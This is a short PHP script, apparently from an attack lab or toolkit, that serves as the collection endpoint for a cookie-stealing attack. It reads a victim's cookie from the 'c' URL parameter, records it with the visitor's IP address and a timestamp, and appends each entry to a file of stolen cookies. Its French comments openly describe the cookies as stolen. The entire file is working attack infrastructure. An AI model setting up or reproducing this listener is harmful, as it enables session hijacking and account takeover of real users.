<?php
// attack/listener/stealer.php

// Récupération du cookie passé dans l'URL
if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    
    // Formatage du log
    $log = "[$date] IP: $ip | Cookie volé : $cookie\n";
    
    // Écriture dans un fichier texte (assure-toi que le serveur a les droits d'écriture)
    file_put_contents('stolen_cookies.txt', $log, FILE_APPEND);
}
?>
